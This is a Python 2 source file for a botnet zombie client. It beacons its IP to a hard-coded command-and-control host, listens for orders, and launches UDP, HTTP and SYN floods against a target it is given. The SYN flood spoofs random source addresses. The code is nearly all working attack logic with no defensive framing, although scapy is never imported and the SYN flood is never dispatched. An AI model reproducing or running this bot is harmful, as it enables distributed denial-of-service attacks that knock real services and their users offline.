import SocketServer
import threading
import time
import socket
import urllib2
import random
import os

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        attack, target, timeout, port, threads = self.data.split(" ")
        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
        self.request.sendall("ACK")
        if attack == "udp":
            fun = attackUDPFlood
        elif attack == "http":
            fun = attackHTTPFlood
        for i in xrange(int(threads)):
            attacker = fun(**kwargs)
            attacker.start()

class attackUDPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = int(kwargs['timeout'])
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.time()
        while time.time() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))

class attackHTTPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            try:
                res = urllib2.urlopen(self.target)
            except IOError:
                print "Could not open ", self.target

class attackSYNFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            ip = IP()
            ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254))
            ip.dst = self.target

            tcp = TCP()
            tcp.sport = random.randint(1,65535)
            tcp.dport = self.port
            tcp.flags = 'S'

            send(ip/tcp, verbose = 0)

class registerIP(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.HOST, self.PORT))
            sock.sendall(socket.gethostbyname(socket.gethostname()))
            time.sleep(60)

class waitForInstructions(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        server = SocketServer.TCPServer((self.HOST, self.PORT), zombie)
        server.serve_forever()

if __name__ == '__main__':
    controlIP = "chunkeey.cs.washington.edu"
    controlIP = "69.91.176.40"
    zombieIP = socket.gethostbyname(socket.gethostname())
    controlPORT = 14000
    getInstrPORT = 15000

    instr = waitForInstructions(zombieIP, getInstrPORT)
    regis = registerIP(controlIP, controlPORT)

    instr.start()
    regis.start()
